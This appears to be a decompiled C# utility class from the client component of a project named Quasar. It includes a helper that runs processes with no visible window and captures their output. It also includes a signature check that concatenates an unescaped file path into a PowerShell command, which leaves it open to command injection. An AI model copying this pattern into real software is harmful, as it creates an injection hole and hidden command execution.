using System.Runtime.CompilerServices;
using System.Diagnostics;

namespace Quasar.Client.Utilities
{
    public static class Misc
    {
        public static int __LINE__([CallerLineNumber] int lineNumber = 0)
        {
            return lineNumber;
        }

        // Token: 0x0600018A RID: 394 RVA: 0x000053F4 File Offset: 0x000035F4
        public static string __FILE__([CallerFilePath] string fileName = "")
        {
            return fileName.Replace("C:\\Users\\xikhud\\Desktop\\Projects\\Quasar-1.2.0.0\\", "");
        }

        // Token: 0x0600018B RID: 395 RVA: 0x00005408 File Offset: 0x00003608
        public static void CheckOutput(string fileName, string cmd, out string stdout, out string stderr)
        {
            Process process = new Process();
            process.StartInfo.UseShellExecute = false;
            process.StartInfo.RedirectStandardOutput = true;
            process.StartInfo.RedirectStandardError = true;
            process.StartInfo.CreateNoWindow = true;
            process.StartInfo.FileName = fileName;
            process.StartInfo.Arguments = cmd;
            process.Start();
            stdout = process.StandardOutput.ReadToEnd();
            stderr = process.StandardError.ReadToEnd();
            process.WaitForExit();
        }

        // Token: 0x0600018C RID: 396 RVA: 0x0000548C File Offset: 0x0000368C
        public static bool CheckSigned(string fullPath)
        {
            string text;
            string text2;
            Misc.CheckOutput("powershell", "(Get-AuthenticodeSignature -FilePath \"" + fullPath + "\").Status", out text, out text2);
            text = text.Trim();
            return text.Equals("Valid");
        }
    }
}
